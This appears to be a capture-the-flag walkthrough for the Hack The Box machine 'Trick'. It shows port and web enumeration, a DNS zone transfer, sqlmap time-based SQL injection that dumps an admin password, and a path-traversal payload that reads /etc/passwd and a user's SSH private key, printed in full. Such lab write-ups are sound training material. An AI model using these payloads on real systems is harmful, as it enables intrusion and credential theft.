## Initial scan

```sh
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61ff293b36bd9dacfbde1f56884cae2d (RSA)
|   256 9ecdf2406196ea21a6ce2602af759a78 (ECDSA)
|_  256 7293f91158de34ad12b54b4a7364b970 (ED25519)

25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING

53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian

80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2

Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## SMTP
*  First we try to quickly sneak some usernames from the SMTP server by using `VRFY`, since we are allowed to use it

```sh
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t trick.htb 

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/top-usernames-shortlist.txt
Target count ............. 1
Username count ........... 17
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Thu Oct 27 20:00:46 2022 #########
######## Scan completed at Thu Oct 27 20:01:06 2022 #########
0 results.

17 queries in 20 seconds (0.8 queries / sec)
```

*  However, we don't have any luck here, so we move on for now to more interesting things like the website

## Initial website enumeration
* When visiting the page we do not have a lot of options to enumerate the page in the browser, so let's move on to tools

![[initial_web.png]]

* Let's start with a quick nikto enumeration 

```sh
nikto -url trick.htb                      
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.166
+ Target Hostname:    trick.htb
+ Target Port:        80
+ Start Time:         2022-10-27 20:05:24 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.14.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)

+ 7786 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2022-10-27 20:08:40 (GMT-4) (196 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

* Nikto could not find anything of interest, so let's move on to a quick dirbust

```sh
ffuf -u http://trick.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt                              
________________________________________________

 :: Method           : GET
 :: URL              : http://trick.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________
assets                  [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 43ms]
css                     [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 34ms]
js                      [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 38ms]
```

* Again, nothing we could further use for our exploitation
* However there is one more thing that we left out since now
* Let's check the DNS servers 

```sh
dig @trick.htb trick.htb 

;; ANSWER SECTION:
trick.htb.604800  IN      A       127.0.0.1

;; AUTHORITY SECTION:
trick.htb.              604800  IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      AAAA    ::1
```

* Always worth checking for zone transfers

```sh
dig axfr @trick.htb trick.htb

trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
```

* And indeed, we found a new subdomain `preprod-payroll.trick.htb`
* Let us add this to our hosts file and check out the web page

![[./Screenshots/payroll.png]]

* Look at that, a login page
* Running a quick dirbust again gives us the following

```sh
gobuster dir -u http://preprod-payroll.trick.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://preprod-payroll.trick.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/27 20:25:53 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/assets/]
/database             (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/database/]
```

* Interestingly, there is a `/database` folder
* Let's see if the webpage is SQLi vulnerable before we try to brute force the login
* Copy the login POST request as cCURL

```sh
sqlmap  'http://preprod-payroll.trick.htb/ajax.php?action=login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' <SNIP> --batch --dbs

<SNIP>

---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1110 FROM (SELECT(SLEEP(5)))BWTk) AND 'kbsu'='kbsu&password=admin
---

[*] information_schema
[*] payroll_db
```

```sh
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+
```

```sh
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type | address | contact | password              | username   |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+

```

* We can now log into the web application and explore the admin panel!

![[./Screenshots/rms.png]]

* After enumerating this for a while, we could not find any vulnerabilities that would help us for a shell or similar
* So, if we take a look at the subdomain `preprod-payroll.trick.htb` we see that it starts with `preprod-` followed by a name, in this case `payroll`
* So lets try to find more subdomains matching this pattern

```sh
ffuf -u http://trick.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: preprod-FUZZ.trick.htb" -fs 5480
________________________________________________
 :: Method           : GET
 :: URL              : http://trick.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: preprod-FUZZ.trick.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 5480
________________________________________________

marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 434ms]
```

* We got a hit on `preprod-marketing.trick.htb`

![[./Screenshots/marketing.png]]

* After some enumeration with ffuf and nikto I the get parameter `?page=` looked like it is loading files

```sh
http://www.preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:112:121::/var/lib/saned:/usr/sbin/nologin colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false sshd:x:118:65534::/run/sshd:/usr/sbin/nologin postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin bind:x:120:128::/var/cache/bind:/usr/sbin/nologin michael:x:1001:1001::/home/michael:/bin/bash
```

* So under about we saw `Erik Morris` being the CEO and `Michel` the CTO
* Lets see if we can find files in `.ssh` for `michael:x:1001:1001::/home/michael:/bin/bash`

```txt
..././..././..././..././..././..././home/michael/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdz
c2gtcnNhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1
Gu4+9P+ohLtzc4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw
4Fwd3K7F4JsnZaJk2GYQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4H
pwRt1T74wioqIX3EAYCCZcf+4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrd
S455nARJtPHYkO9eobmyamyNDgAia/Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkAT
WMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK41kC+t4a8sQAAA8hzFJk2cxSZNgAA
AAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaCDkelLDMdnC73k2qHUa7j70
/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0+93NpCpgrHDgXB3c
rsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizEhkXgenBG3V
PvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1Ljnmc
BEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmo
U6IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri
/dldDc3CaUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4
ulSt2T/mQYlmi/KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6
L9k75t0aBWMR7ru7EYjCtnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFP
Swf01VlEZvIEWAEY6qv7r455GeU+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHR
jYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtL
OFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1VPH+7+Oono2E7cgBv7GIqpdxRso
zETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS3AZ4FVonhCl5DFVPEz4U
dlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXAfvjlQQh81veQAA
AIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sTAuNHUSgX
/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgnIn
16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxY
r9DPJkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySv
fVNPtSb0XNjsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VV
fvJDZa67XNHzrxi+IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

* We are on the system